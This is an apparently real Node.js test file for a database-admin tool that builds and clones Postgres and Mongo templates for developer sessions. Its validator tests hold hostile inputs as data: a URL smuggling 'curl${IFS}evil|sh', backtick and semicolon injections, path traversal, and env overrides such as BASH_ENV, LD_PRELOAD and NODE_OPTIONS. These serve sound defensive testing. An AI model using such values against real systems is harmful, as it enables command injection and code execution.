import { test } from 'node:test';
import assert from 'node:assert/strict';

import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import {
  combinedDecision, createDbAdmin, gitChangedSince, installationEnvSecretName, ownerName, parseArgs, runDatabases, secretName, seedEnv,
  seedEnvFiles, sessionName, sessionSecretName, sharedServices, templateDecision, unexpectedEnv,
} from './dbAdmin.mjs';

import { MONGO_READY } from '../shared/databases/mongo.mjs';
import { parseProject } from '../shared/project.mjs';
import { fixtureCheckout, fixtureProject, fixtureProjectFiles } from '../shared/projectFixture.mjs';

// A project's databases as the project file gives them: a Postgres whose template is built from api/db, and a Mongo
// seeded beside it.
const database = {
  engine: 'postgres', dir: 'api', migrate: 'npm run migrate', seed: 'npm run seed', envFiles: [], paths: ['api/db'],
  migrations: 'api/db/migrations', user: null, name: null,
};
const MONGO = { ...database, engine: 'mongo', migrate: null, seed: 'npm run seed:mongo' };
// What the task definition's entryPoint fixes; a run adds only what comes after the `--`.
const FIXED = ['--region', 'us-east-1', '--pg-host', 'db.rds', '--pg-root-user', 'app_user', '--pg-ca', '/ca.pem',
  '--mongo-host', '10.0.0.10:27017', '--secret-prefix', 'woodshed-cloud/', '--repo', '/work/app', '--'];
// The same for an installation with Postgres alone: no Mongo host; and with Mongo alone.
const without = (flags) => FIXED.filter((a, i) => !flags.includes(a) && !flags.includes(FIXED[i - 1]));
const PG_ONLY = without(['--mongo-host']);
const MONGO_ONLY = without(['--pg-host', '--pg-root-user', '--pg-ca']);
const FLAGS = parseArgs([...FIXED, 'template']).flags;

test('parseArgs takes the flags from the entryPoint and only an action and an owner from the run', () => {
  assert.deepEqual(parseArgs([...FIXED, 'reset', 'mia-dev']).owner, 'mia-dev');
  assert.equal(parseArgs([...FIXED, 'clone', '0a1b2c3d']).flags['pg-host'], 'db.rds');
  assert.equal(parseArgs([...FIXED, 'drop-session', '0a1b2c3d']).action, 'drop-session');
  assert.equal(parseArgs([...FIXED, 'template']).action, 'template');
});

test('parseArgs takes an installation with no Mongo, and each run then makes Postgres alone', () => {
  const { flags } = parseArgs([...PG_ONLY, 'clone', '0a1b2c3d']);
  assert.equal(flags['mongo-host'], undefined);
  assert.deepEqual(runDatabases(flags), ['postgres']);
  assert.deepEqual(runDatabases(FLAGS), ['postgres', 'mongo']);
  for (const flag of ['--pg-host', '--pg-root-user', '--pg-ca']) {
    const without = PG_ONLY.filter((a, i) => a !== flag && PG_ONLY[i - 1] !== flag);
    assert.throws(() => parseArgs([...without, 'template']), /missing flags/, flag);
  }
});

test('parseArgs takes an installation with Mongo alone, and one with no engine\'s flags is refused', () => {
  assert.deepEqual(runDatabases(parseArgs([...MONGO_ONLY, 'template']).flags), ['mongo']);
  const none = MONGO_ONLY.filter((a, i) => a !== '--mongo-host' && MONGO_ONLY[i - 1] !== '--mongo-host');
  assert.throws(() => parseArgs([...none, 'template']), /no database engine's flags: give --pg-host or --mongo-host/);
});

test('parseArgs refuses a run that tries to change a flag, or anything it does not know', () => {
  for (const command of [['--pg-host', 'evil', 'reset', 'mia'], ['reset', 'mia', '--pg-host', 'evil'], ['psql'], ['reset'], ['template', 'x'],
    ['setup'], ['reset', 'mia;drop'], ['reset', '../x'], ['clone', 'mia-dev'], ['clone', '0A1B2C3D'], ['drop-session', '0a1b2c3d9'],
    ['reset', '0a1b2c3d_'], ['drop', 'woodshed__x']]) {
    assert.throws(() => parseArgs([...FIXED, ...command]), { refused: true }, command.join(' '));
  }
  assert.throws(() => parseArgs(['--pg-host', 'evil', ...FIXED, 'template']), /bad flag/, 'a flag twice');
  assert.throws(() => parseArgs([...FIXED.slice(0, -1), 'template']), /must end its flags with --/);
});

test('parseArgs takes the secrets from Secrets Manager or from a folder of files, exactly one, and an empty prefix only with files', () => {
  const local = ['--secrets-dir', '/run/woodshed-secrets', '--pg-host', 'postgres', '--pg-root-user', 'postgres', '--pg-ca', 'none',
    '--mongo-host', 'mongo:27017', '--secret-prefix', '', '--repo', '/work/app', '--'];
  assert.equal(parseArgs([...local, 'reset', 'mia-dev']).flags['secrets-dir'], '/run/woodshed-secrets');
  assert.throws(() => parseArgs(['--region', 'us-east-1', ...local, 'template']), /give one of --region or --secrets-dir/);
  const noSource = local.slice(2);
  assert.throws(() => parseArgs([...noSource, 'template']), /give one of/);
  const emptyPrefixOnAws = FIXED.map((a) => (a === 'woodshed-cloud/' ? '' : a));
  assert.throws(() => parseArgs([...emptyPrefixOnAws, 'template']), /missing flags: secret-prefix/);
});

test('ownerName gives each GitHub login a name no other login, session or the template can have', () => {
  assert.equal(ownerName('Mia-Dev'), 'woodshed_mia_dev');
  assert.equal(ownerName('template'), 'woodshed_template');
  for (const bad of ['-mia', 'mia-', 'mia--dev', 'mia_dev', 'a'.repeat(40), '']) assert.throws(() => ownerName(bad), /not a GitHub login/, bad);
  // A login never starts with `-`, so no login's name starts `woodshed__`, where sessions' and the template's are.
  assert.equal(sessionName('0a1b2c3d'), 'woodshed__0a1b2c3d');
  assert.doesNotMatch(ownerName('a-0a1b2c3d'), /^woodshed__/);
  for (const bad of ['0a1b2c3', 'template', 'G0000000', '']) assert.throws(() => sessionName(bad), /not a session id/, bad);
});

test('a person\'s password is among their own secrets, and a session\'s among the sessions\'', () => {
  assert.equal(secretName('woodshed-cloud/', 'Mia-Dev'), 'woodshed-cloud/users/mia-dev/database');
  assert.equal(sessionSecretName('woodshed-cloud/', '0a1b2c3d'), 'woodshed-cloud/sessions/0a1b2c3d/database');
});

// db-admin runs the session image, so a variable the image's Dockerfile sets reaches it on every run. #26867 added
// REPO_DIR there, and every template build after it refused to start.
test('every variable the session image sets is one db-admin expects', () => {
  const dockerfile = fs.readFileSync(path.join(import.meta.dirname, 'Dockerfile'), 'utf8');
  const names = [...dockerfile.matchAll(/^ENV ([A-Z_][A-Z0-9_]*)=/gm)].map((m) => m[1]);
  assert.ok(names.includes('PATH') && names.includes('REPO_DIR'), 'read the image\'s ENV lines');
  assert.deepEqual(unexpectedEnv(Object.fromEntries(names.map((name) => [name, 'x'])), FLAGS), []);
});

test('unexpectedEnv names what a run\'s overrides could add, and passes what the agent, image and task set', () => {
  const expected = {
    PATH: '/usr/bin', HOME: '/home/node', HOSTNAME: 'ip-10-42-1-5', LANG: 'C.UTF-8', NODE_VERSION: '22.16.0', YARN_VERSION: '1.22.22',
    NODE_EXTRA_CA_CERTS: '/etc/ssl/certs/rds-global-bundle.pem', PG_ROOT_PASSWORD: 'x', MONGO_ROOT_PASSWORD: 'x',
    AWS_REGION: 'us-east-1', AWS_CONTAINER_CREDENTIALS_RELATIVE_URI: '/v2/x', ECS_CONTAINER_METADATA_URI_V4: 'http://169.254.170.2/v4/x',
    WOODSHED_SERVICES: 'STORE_URL PDF_URL', STORE_URL: 'http://10.42.1.10:4566', PDF_URL: 'http://10.42.1.10:3000',
  };
  assert.deepEqual(unexpectedEnv(expected, FLAGS), []);
  assert.deepEqual(unexpectedEnv({ ...expected, WOODSHED_SERVICES: 'STORE_URL' }, FLAGS), ['PDF_URL'], 'a service\'s variable only while the list names it');
  assert.deepEqual(unexpectedEnv({ ...expected, API_ENV: 'NODE_OPTIONS=--import=data:,', BASH_ENV: '/tmp/x', NODE_PATH: '/tmp', AWS_ENDPOINT_URL: 'https://evil', AWS_CA_BUNDLE: '/tmp/ca' }, FLAGS), ['API_ENV', 'AWS_CA_BUNDLE', 'AWS_ENDPOINT_URL', 'BASH_ENV', 'NODE_PATH']);
  // Mongo's root password only where the run has a Mongo host to hand it to.
  assert.deepEqual(unexpectedEnv(expected, parseArgs([...PG_ONLY, 'template']).flags), ['MONGO_ROOT_PASSWORD']);
  assert.deepEqual(unexpectedEnv(expected, parseArgs([...MONGO_ONLY, 'template']).flags), ['PG_ROOT_PASSWORD']);
  assert.throws(() => sharedServices({ WOODSHED_SERVICES: 'MONGO_ROOT_PASSWORD', MONGO_ROOT_PASSWORD: 'http://x' }), /not a shared service's variable/);
});

test('the shared services the seed gets are the listed _URL or _ENDPOINT variables, each a plain http(s) URL', () => {
  assert.deepEqual(sharedServices({}), {}, 'an installation with none');
  assert.deepEqual(sharedServices({ WOODSHED_SERVICES: 'STORE_URL PDF_URL', STORE_URL: 'http://10.0.0.1:4566', PDF_URL: 'https://pdf:3000', OTHER: 'x' }),
    { STORE_URL: 'http://10.0.0.1:4566', PDF_URL: 'https://pdf:3000' });
  assert.deepEqual(sharedServices({ WOODSHED_SERVICES: 'S3_ENDPOINT', S3_ENDPOINT: 'http://s3.local:4566/bucket_a/x-y' }),
    { S3_ENDPOINT: 'http://s3.local:4566/bucket_a/x-y' });
  assert.throws(() => sharedServices({ WOODSHED_SERVICES: 'STORE_URL' }), /STORE_URL, a shared service's variable, must be a plain http\(s\) URL/);
  // What a run's overrides could try: a variable bash or Node acts on, or a URL-shaped value carrying shell syntax.
  for (const name of ['BASH_ENV', 'ENV', 'NODE_OPTIONS', 'LD_PRELOAD', 'GIT_SSH_COMMAND', 'PS4', 'PATH', 'PG_ROOT_PASSWORD', 'lower_URL', 'A-B_URL']) {
    assert.throws(() => sharedServices({ WOODSHED_SERVICES: name, [name]: 'http://x' }), /which is not a shared service's variable/, name);
  }
  for (const value of ['https://x$(curl${IFS}evil|sh)', 'http://x`id`', 'http://x;id', 'http://x/a?b=c', 'http://user@x', 'ftp://x']) {
    assert.throws(() => sharedServices({ WOODSHED_SERVICES: 'STORE_URL', STORE_URL: value }), /must be a plain http\(s\) URL/, value);
  }
});

test('a template with no commit to compare, from the image or its own, is built again', async () => {
  const changedSince = async () => assert.fail('nothing to compare');
  assert.equal((await templateDecision({ builtFrom: undefined, buildSha: 'new', database, changedSince })).action, 'rebuild',
    'a template made before it said its commit, or none at all');
  assert.equal((await templateDecision({ builtFrom: 'old', buildSha: null, database, changedSince })).action, 'rebuild',
    'an image that does not say its commit');
  assert.deepEqual(await templateDecision({ builtFrom: 'same', buildSha: 'same', database, changedSince }), { action: 'keep', reason: 'built from this commit' });
});

// A throwaway repo, so the decision runs on the real git command against each kind of change.
function scratchRepo() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'db-admin-git-'));
  const git = (...args) => execFileSync('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@t', ...args], { encoding: 'utf8' }).trim();
  const write = (file, text) => {
    fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
    fs.writeFileSync(path.join(dir, file), text);
  };
  const commit = (message) => {
    git('add', '-A');
    git('commit', '-qm', message);
    return git('rev-parse', 'HEAD');
  };
  git('init', '-q');
  write('api/db/migrations/001.ts', 'one');
  write('api/db/seeds/01_orgs.ts', 'orgs');
  write('api/src/app.ts', 'app');
  const first = commit('first');
  return { dir, git, write, commit, first, cleanUp: () => fs.rmSync(dir, { recursive: true, force: true }) };
}

test('the template is kept for an app change, migrated for new migrations, and built again for anything else in api/db', async () => {
  const repo = scratchRepo();
  try {
    const decide = async () => templateDecision({
      builtFrom: repo.first, buildSha: repo.git('rev-parse', 'HEAD'), database, changedSince: gitChangedSince(repo.dir),
    });
    repo.write('api/src/app.ts', 'app, changed');
    repo.commit('app only');
    assert.deepEqual(await decide(), { action: 'keep', reason: 'api/db unchanged' });

    repo.write('api/db/migrations/002.ts', 'two');
    repo.commit('a new migration');
    assert.deepEqual(await decide(), { action: 'migrate', reason: 'only new migrations' });

    repo.write('api/db/migrations/001.ts', 'one, edited');
    repo.commit('an edited migration');
    assert.deepEqual(await decide(), { action: 'rebuild', reason: 'a migration was edited or removed' });
    repo.git('reset', '-q', '--hard', 'HEAD~1');

    repo.git('rm', '-q', 'api/db/migrations/001.ts');
    repo.commit('a removed migration');
    assert.equal((await decide()).action, 'rebuild');
    repo.git('reset', '-q', '--hard', 'HEAD~1');

    repo.write('api/db/seeds/01_orgs.ts', 'orgs, changed');
    repo.commit('a seed change');
    assert.deepEqual(await decide(), { action: 'rebuild', reason: 'api/db changed outside its migrations' });

    const unknown = await templateDecision({ builtFrom: '0'.repeat(40), buildSha: 'new', database, changedSince: gitChangedSince(repo.dir) });
    assert.equal(unknown.action, 'rebuild', 'a commit the checkout does not have');

    const noMigrations = await templateDecision({ builtFrom: repo.first, buildSha: 'new', database: { ...database, migrations: null }, changedSince: gitChangedSince(repo.dir) });
    assert.deepEqual(noMigrations, { action: 'rebuild', reason: 'api/db changed, and the project file names no migrations' });
    const noPaths = await templateDecision({ builtFrom: repo.first, buildSha: 'new', database: { paths: [], migrations: null }, changedSince: gitChangedSince(repo.dir) });
    assert.equal(noPaths.action, 'rebuild', 'a project that names no paths cannot tell, so it builds again');
  } finally {
    repo.cleanUp();
  }
});

test('the templates are built together, so the strongest database\'s decision is every one\'s', () => {
  assert.equal(combinedDecision([{ action: 'keep' }, { action: 'keep' }]), 'keep');
  assert.equal(combinedDecision([{ action: 'migrate' }, { action: 'keep' }]), 'migrate');
  assert.equal(combinedDecision([{ action: 'keep' }, { action: 'rebuild' }, { action: 'migrate' }]), 'rebuild');
});

test('a project with no databases stops the task, rather than building a template from a folder nobody named', (t) => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'dbAdmin-nodb-'));
  t.after(() => fs.rmSync(repo, { recursive: true, force: true }));
  fs.mkdirSync(path.join(repo, '.woodshed'));
  fs.writeFileSync(path.join(repo, '.woodshed/project.yaml'), fixtureProject({ databases: [] }));
  assert.throws(() => createDbAdmin({ flags: { ...FLAGS, repo }, env: {}, secrets: {} }),
    /\.woodshed\/project\.yaml has no databases \(databases: \[\]\), so there is nothing for this task to build or copy/);
});

test('a project database on an engine the installation does not host stops the task, naming it', () => {
  const flags = parseArgs([...PG_ONLY, 'template']).flags;
  assert.throws(() => createDbAdmin({ flags, env: {}, secrets: {}, databases: [database, MONGO], drivers: { postgres: {}, mongo: {} } }),
    /the project file's databases need mongo, and this installation hosts postgres only: its db-admin task has no --mongo-host/);
});

test('the seed gets each database\'s own variables, on its next template, as the seeder, and no root password', () => {
  const env = seedEnv({
    flags: { ...FLAGS, 'pg-ca': 'none' }, env: { PG_ROOT_PASSWORD: 'root', MONGO_ROOT_PASSWORD: 'root' }, databases: [database, MONGO],
    user: 'woodshed__seed', name: 'woodshed__template_next', password: 'ab', files: { API_ENV: 'X=1' },
  });
  assert.ok(!('API_ENV' in env), 'no env file\'s old secret, even from a caller that still passes one');
  assert.deepEqual([env.PGHOST, env.PGPORT, env.PGUSER, env.PGPASSWORD, env.PGDATABASE, env.PGSSLMODE], ['db.rds', '5432', 'woodshed__seed', 'ab', 'woodshed__template_next', 'disable']);
  assert.equal(env.PG_URL, 'postgres://woodshed__seed:ab@db.rds:5432/woodshed__template_next?sslmode=disable');
  assert.equal(env.MONGODB_URI, 'mongodb://woodshed__seed:ab@10.0.0.10:27017/woodshed__template_next?authSource=woodshed__template_next');
  assert.ok(!Object.values(env).includes('root'), 'no root password');
  const pgOnly = seedEnv({ flags: FLAGS, env: {}, databases: [database], user: 'u', name: 'n', password: 'p' });
  assert.equal(pgOnly.PGSSLMODE, 'verify-full', 'verified against the CA the entryPoint names');
  assert.ok(!('MONGODB_URI' in pgOnly), 'no Mongo for a project with none');
});

// Postgres as closePublicAccess sees it: which databases every role may connect to, and what a REVOKE changes.
function fakePg({ open, notMine = [] }) {
  const queries = [];
  const state = new Set(open);
  class Client {
    async connect() {}
    async end() {}
    escapeIdentifier(name) { return `"${name}"`; }
    async query(sql, params) {
      queries.push(sql);
      if (sql.startsWith('SELECT datname')) return { rows: [...state].filter((d) => !params[0].includes(d)).map((datname) => ({ datname })) };
      const name = /ON DATABASE "([^"]+)"/.exec(sql)?.[1];
      if (name && !notMine.includes(name)) state.delete(name);
      return { rows: [] };
    }
  }
  return { driver: { postgres: { Client } }, queries };
}

test('every run closes the databases every user could connect to, and names any it could not', async () => {
  const { driver, queries } = fakePg({ open: ['woodshed_mia_dev_test', 'woodshed__0a1b2c3d_template', 'app', 'someone_elses'], notMine: ['someone_elses'] });
  const admin = createDbAdmin({ flags: { ...parseArgs([...FIXED, 'template']).flags, 'pg-ca': 'none' }, env: { PG_ROOT_PASSWORD: 'x' }, secrets: {}, databases: [database], drivers: driver });
  const [result] = await admin.maintain();
  assert.deepEqual(result, { engine: 'postgres', message: 'WARNING: some databases are still open to every user', fields: { closed: 3, stillOpen: ['someone_elses'] } });
  assert.ok(queries.includes('REVOKE CONNECT, TEMPORARY ON DATABASE "woodshed_mia_dev_test" FROM PUBLIC'));
  assert.match(queries[0], /NOT datistemplate/, 'template0 and template1 are left as Postgres has them');
});

// Postgres as the copies and the template see it: which databases and roles exist, and the template's comment.
function fakeTemplatePg({ comment = null } = {}) {
  const queries = [];
  const state = { comment };
  class Client {
    async connect() {}
    async end() {}
    escapeIdentifier(name) { return `"${name}"`; }
    escapeLiteral(text) { return `'${text.replace(/'/g, "''")}'`; }
    async query(sql) {
      queries.push(sql);
      if (sql.includes('shobj_description')) return { rows: state.comment ? [{ comment: state.comment }] : [], rowCount: state.comment ? 1 : 0 };
      if (sql.includes('AND datistemplate')) return { rows: [{}], rowCount: state.comment ? 1 : 0 };
      if (sql.startsWith('COMMENT ON DATABASE')) state.comment = /IS '(.*)'$/.exec(sql)[1];
      return { rows: [], rowCount: 0 };
    }
  }
  // A Mongo client made at all is a run that reached for a database the project does not have.
  class MongoClient {
    constructor() { throw new Error('no Mongo in this project'); }
  }
  return { driver: { postgres: { Client }, mongo: { MongoClient } }, queries, state };
}

const PASSWORD = 'ab'.repeat(24);

test('with Postgres alone, a clone copies the Postgres template and never reaches for Mongo', async () => {
  const { driver, queries } = fakeTemplatePg({ comment: JSON.stringify({ builtFrom: 'abc', readyAt: '2026-11-09T00:00:00.000Z' }) });
  // The installation hosts Mongo too; the project has no database on it.
  const flags = { ...parseArgs([...FIXED, 'clone', '0a1b2c3d']).flags, 'pg-ca': 'none' };
  const admin = createDbAdmin({ flags, env: { PG_ROOT_PASSWORD: 'x' }, secrets: { get: async () => PASSWORD }, databases: [database], drivers: driver });
  await admin.clone('0a1b2c3d');
  assert.ok(queries.includes('CREATE DATABASE "woodshed__0a1b2c3d" TEMPLATE "woodshed__template" OWNER "woodshed__0a1b2c3d" ALLOW_CONNECTIONS true IS_TEMPLATE false'));
  assert.deepEqual((await admin.maintain()).map((r) => r.engine), ['postgres'], 'no Mongo users to give roles to');
});

test('with Postgres alone, the template says its commit in its comment, and is kept for the same commit', async () => {
  const { driver, queries, state } = fakeTemplatePg();
  const flags = { ...parseArgs([...PG_ONLY, 'template']).flags, 'pg-ca': 'none' };
  const seeded = [];
  const make = () => createDbAdmin({
    flags, env: { PG_ROOT_PASSWORD: 'x' }, secrets: {}, databases: [database], drivers: driver, buildSha: 'abc',
    seed: async ({ name }) => { seeded.push(name); },
  });
  await make().template();
  assert.deepEqual(seeded, ['woodshed__template_next']);
  assert.equal(JSON.parse(state.comment).builtFrom, 'abc');
  assert.match(queries.at(-1), /^COMMENT ON DATABASE "woodshed__template" IS /, 'written last, once it is a template');
  await make().template();
  assert.equal(seeded.length, 1, 'kept: built from this commit');
});

test('a run with a Mongo database and no root password for it is refused before it reaches Mongo', async () => {
  const { driver } = fakeTemplatePg();
  const admin = createDbAdmin({ flags: { ...FLAGS, 'pg-ca': 'none' }, env: { PG_ROOT_PASSWORD: 'x' }, secrets: { get: async () => PASSWORD }, databases: [database, MONGO], drivers: driver });
  await assert.rejects(admin.clone('0a1b2c3d'), /MONGO_ROOT_PASSWORD must come from the task definition's secrets, with --mongo-host/);
});

// Mongo as a copy and the template see it: each database's collections, its users, and the template's ready marker.
function fakeMongo({ ready = null } = {}) {
  const dbs = new Map();
  // Users live in admin's, so a dropped database keeps its own.
  const users = new Map();
  const calls = [];
  const dbOf = (name) => {
    if (!dbs.has(name)) dbs.set(name, { collections: new Map() });
    return dbs.get(name);
  };
  const usersOf = (name) => users.get(name) ?? [];
  const collection = (dbName, name) => ({
    async findOne() { return dbOf(dbName).collections.get(name)?.[0] ?? null; },
    async insertOne(doc) { dbOf(dbName).collections.set(name, [{ _id: { toHexString: () => 'marker1' }, ...doc }]); },
    listIndexes: () => ({ toArray: async () => [] }),
    async createIndexes() {},
    aggregate([{ $out: { db, coll } }]) {
      return { toArray: async () => { dbOf(db).collections.set(coll, [...(dbOf(dbName).collections.get(name) ?? [])]); return []; } };
    },
  });
  class MongoClient {
    async connect() {}
    async close() {}
    db(name) {
      return {
        collection: (c) => collection(name, c),
        listCollections: () => ({ toArray: async () => [...dbOf(name).collections.keys()].map((c) => ({ name: c, options: {} })) }),
        async createCollection(c) { if (!dbOf(name).collections.has(c)) dbOf(name).collections.set(c, []); },
        async dropDatabase() { calls.push(`drop ${name}`); dbs.delete(name); },
        async command(cmd) {
          calls.push(`${Object.keys(cmd)[0]} ${name}`);
          if (cmd.usersInfo) return { users: cmd.usersInfo.forAllDBs ? [] : usersOf(name).filter((u) => u === cmd.usersInfo) };
          if (cmd.createUser) users.set(name, [...usersOf(name), cmd.createUser]);
          if (cmd.dropAllUsersFromDatabase) users.delete(name);
          return {};
        },
      };
    }
  }
  if (ready) {
    dbOf('woodshed__template').collections.set('orgs', [{ id: 1 }]);
    dbOf('woodshed__template').collections.set(MONGO_READY, [{ _id: { toHexString: () => 'marker1' }, builtFrom: ready }]);
  }
  return { driver: { mongo: { MongoClient } }, dbs, users, calls };
}

test('with Mongo alone, a clone copies the Mongo template without its marker, and needs no Postgres at all', async () => {
  const { driver, dbs, users } = fakeMongo({ ready: 'abc' });
  const flags = parseArgs([...MONGO_ONLY, 'clone', '0a1b2c3d']).flags;
  const admin = createDbAdmin({ flags, env: { MONGO_ROOT_PASSWORD: 'x' }, secrets: { get: async () => PASSWORD }, databases: [MONGO], drivers: driver });
  await admin.clone('0a1b2c3d');
  const copy = dbs.get('woodshed__0a1b2c3d');
  assert.deepEqual([...copy.collections.keys()], ['orgs'], 'the ready marker is the template\'s alone');
  assert.deepEqual(users.get('woodshed__0a1b2c3d'), ['woodshed__0a1b2c3d']);
});

test('with Mongo alone, the template is seeded, marked ready with its commit, and kept for the same commit', async () => {
  const { driver, dbs } = fakeMongo();
  const flags = parseArgs([...MONGO_ONLY, 'template']).flags;
  const seeded = [];
  const make = () => createDbAdmin({
    flags, env: { MONGO_ROOT_PASSWORD: 'x' }, secrets: {}, databases: [MONGO], drivers: driver, buildSha: 'abc',
    seed: async ({ name }) => { seeded.push(name); dbs.set(name, { collections: new Map([['orgs', [{ id: 1 }]]]) }); },
  });
  await make().template();
  assert.deepEqual(seeded, ['woodshed__template_next']);
  assert.equal((await dbs.get('woodshed__template').collections.get(MONGO_READY))[0].builtFrom, 'abc');
  assert.ok(!dbs.has('woodshed__template_next'), 'the next template goes once it is swapped in');
  await make().template();
  assert.equal(seeded.length, 1, 'kept: built from this commit');
});

test('the installation\'s project file is read from the entryPoint\'s --project-files-dir alone, and the seed reads the same', (t) => {
  const checkout = fixtureCheckout(fs.mkdtempSync(path.join(os.tmpdir(), 'dbAdmin-installation-')), { repo: 'acme/app' });
  const files = fixtureProjectFiles(fs.mkdtempSync(path.join(os.tmpdir(), 'dbAdmin-files-')), { 'acme/app': fixtureProject({ databases: [database] }) });
  t.after(() => [checkout, files].forEach((dir) => fs.rmSync(dir, { recursive: true, force: true })));
  const flags = parseArgs([...FIXED.slice(0, -1), '--project-files-dir', files, '--', 'template']).flags;
  assert.equal(flags['project-files-dir'], files);
  assert.throws(() => parseArgs([...FIXED.slice(0, -1), '--project-files-dir', files, '--', 'template', 'extra']), { refused: true });

  const before = process.env.WOODSHED_PROJECT_FILES_DIR;
  t.after(() => {
    if (before === undefined) delete process.env.WOODSHED_PROJECT_FILES_DIR;
    else process.env.WOODSHED_PROJECT_FILES_DIR = before;
  });
  // A variable a run's overrides could set is not where the task finds its project file.
  process.env.WOODSHED_PROJECT_FILES_DIR = files;
  assert.throws(() => createDbAdmin({ flags: { ...FLAGS, repo: checkout }, env: {}, secrets: {}, drivers: { postgres: {}, mongo: {} } }),
    /has no databases \(databases: \[\]\)/);
  delete process.env.WOODSHED_PROJECT_FILES_DIR;
  assert.doesNotThrow(() => createDbAdmin({ flags: { ...flags, repo: checkout, 'pg-ca': 'none' }, env: {}, secrets: {}, drivers: { postgres: {}, mongo: {} } }));

  const env = seedEnv({ flags, env: {}, databases: [database], user: 'u', name: 'n', password: 'p' });
  assert.equal(env.WOODSHED_PROJECT_FILES_DIR, files);
  assert.equal(seedEnv({ flags: FLAGS, env: {}, databases: [database], user: 'u', name: 'n', password: 'p' }).WOODSHED_PROJECT_FILES_DIR, undefined);
});

test('parseArgs takes the default project from the entryPoint\'s --project, and refuses one that is not a project\'s name', () => {
  const at = (name) => [...FIXED.slice(0, -1), '--project', name, '--', 'template'];
  assert.equal(parseArgs(at('acme-app')).flags.project, 'acme-app');
  assert.equal(FLAGS.project, undefined, 'optional: an entryPoint from before it gives the seed no installation values');
  for (const bad of ['../users', 'App', 'a--b', 'a/env', 'x'.repeat(33)]) assert.throws(() => parseArgs(at(bad)), { refused: true }, bad);
  assert.throws(() => parseArgs([...at('app'), 'reset']), { refused: true }, 'a run adds nothing but its command');
  assert.equal(installationEnvSecretName('woodshed/', 'app', 'api-env'), 'woodshed/repos/app/env/api-env');
});

// The databases' env files: api/.env with a secret (its key), and web/.env.local with none, named by its path's key.
const SEED_PROJECT = parseProject({
  version: 1,
  envFiles: [
    { path: 'api/.env', secret: 'api-env', lines: ['DATABASE_URL={{PG_URL}}'] },
    { path: 'web/.env.local', defaults: ['NEXT_PUBLIC_MODE=dev'], lines: [] },
    { path: 'tools/.env', secret: 'tools-env', lines: [] },
  ],
  databases: [{ engine: 'postgres', dir: 'api', envFiles: ['api-env', 'web-env-local'] }],
});

// A store of secrets that says which names were asked for.
function recordingSecrets(values) {
  const asked = [];
  return { asked, get: async (name) => (asked.push(name), values[name] ?? null) };
}

test('the seed\'s env files come from the default project\'s repo settings, each key alone, and never anyone\'s own', async () => {
  const flags = { ...parseArgs([...FIXED.slice(0, -1), '--project', 'app', '--', 'template']).flags };
  const secrets = recordingSecrets({
    'woodshed-cloud/repos/app/env/api-env': 'API_KEY=new\n', 'woodshed-cloud/repos/app/env/web-env-local': 'NEXT_PUBLIC_MODE=qa\n',
    'woodshed-cloud/api-env': 'API_KEY=old\n', 'woodshed-cloud/repos/app/env/tools-env': 'T=1',
  });
  const found = await seedEnvFiles({ flags, project: SEED_PROJECT, secrets });
  assert.deepEqual(found.settings, {
    project: 'app',
    envFiles: { 'api-env': { installation: 'API_KEY=new\n', personal: null }, 'web-env-local': { installation: 'NEXT_PUBLIC_MODE=qa\n', personal: null } },
    instructions: { installation: null, personal: null }, personalFor: null,
  });
  assert.equal('files' in found, false);
  assert.deepEqual(found.read, [{ key: 'api-env', from: 'repo settings' }, { key: 'web-env-local', from: 'repo settings' }]);
  assert.deepEqual(secrets.asked, ['woodshed-cloud/repos/app/env/api-env', 'woodshed-cloud/repos/app/env/web-env-local'],
    'only the databases\' keys, only the default project\'s, and never an env file\'s old Terraform secret');
});

test('a key with no repo settings value is empty: the old Terraform secret is never read', async () => {
  const flags = parseArgs([...FIXED.slice(0, -1), '--project', 'app', '--', 'template']).flags;
  const secrets = recordingSecrets({ 'woodshed-cloud/repos/app/env/api-env': '  \n', 'woodshed-cloud/api-env': 'API_KEY=old\n' });
  const found = await seedEnvFiles({ flags, project: SEED_PROJECT, secrets });
  assert.deepEqual(found.settings.envFiles, {}, 'a blank value is none, as the session API leaves it out');
  assert.deepEqual(found.read, [{ key: 'api-env', from: 'none' }, { key: 'web-env-local', from: 'none' }]);
  assert.deepEqual(secrets.asked, ['woodshed-cloud/repos/app/env/api-env', 'woodshed-cloud/repos/app/env/web-env-local']);
});

test('without --project the seed reads nothing: its env files get the repo\'s defaults and lines alone', async () => {
  const secrets = recordingSecrets({ 'woodshed-cloud/api-env': 'API_KEY=old\n', 'woodshed-cloud/repos/app/env/api-env': 'API_KEY=new\n' });
  const found = await seedEnvFiles({ flags: FLAGS, project: SEED_PROJECT, secrets });
  assert.equal(found.settings, null);
  assert.deepEqual(found.read.map((r) => r.from), ['none', 'none']);
  assert.deepEqual(secrets.asked, []);
});

test('the seed is told where its repo settings are, and nothing else can stand in for it', () => {
  const env = seedEnv({
    flags: FLAGS, env: { WOODSHED_SEED_REPO_SETTINGS: '/etc/passwd' }, databases: [database], user: 'u', name: 'n', password: 'p',
    files: { WOODSHED_SEED_REPO_SETTINGS: '/etc/passwd' }, settingsFile: '/tmp/woodshed-seed-x/repo-settings.json',
  });
  assert.equal(env.WOODSHED_SEED_REPO_SETTINGS, '/tmp/woodshed-seed-x/repo-settings.json');
  assert.ok(!('WOODSHED_SEED_REPO_SETTINGS' in seedEnv({ flags: FLAGS, env: {}, databases: [database], user: 'u', name: 'n', password: 'p' })));
});
